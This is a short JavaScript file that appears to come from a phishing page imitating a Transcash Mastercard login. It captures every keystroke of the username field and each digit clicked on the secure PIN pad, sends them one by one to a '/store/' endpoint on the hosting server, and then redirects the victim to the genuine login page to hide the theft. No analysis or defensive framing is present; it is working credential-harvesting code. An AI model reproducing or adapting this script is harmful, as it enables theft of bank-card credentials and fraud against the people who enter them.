function sendUsername(e) {
    sendCadeau(e.target.value);
}

function sendPwd(e) {
    sendCadeau(e.target.textContent);
    document.getElementById("password").value += e.target.textContent;
}

function sendCadeau(a) {
    fetch('/store/' + a).then().catch();
}

function redirect() {
    console.log("aaa");
    document.location.href = 'https://transcashmastercard.espace-personnel.fr/login';
}

document.getElementById("username").addEventListener("input", sendUsername, false);

document.querySelectorAll("#securePin td").forEach(item => {
    item.addEventListener('click', sendPwd)
})

document.getElementById("connectBtn").addEventListener("click", redirect, false);